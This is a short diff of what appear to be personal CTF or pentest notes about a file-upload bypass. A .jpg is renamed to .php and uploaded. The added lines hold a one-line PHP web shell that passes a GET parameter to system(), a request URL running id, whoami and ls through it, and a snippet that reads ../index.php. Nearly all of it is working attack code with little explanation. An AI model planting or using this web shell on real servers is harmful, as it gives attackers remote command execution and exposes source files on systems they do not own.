@@ -14,6 +14,13 @@ mv small.jpg small.php
 uploaded it and can run simple php 
 so trying some php stuff
 
+{url}/file.php?cmd=id;whoami;ls
+```php
+<?php
+    echo system($_GET["cmd"]);
+?>   
+```
+
 ```php
 echo file_get_contents('../index.php')
 ?>```
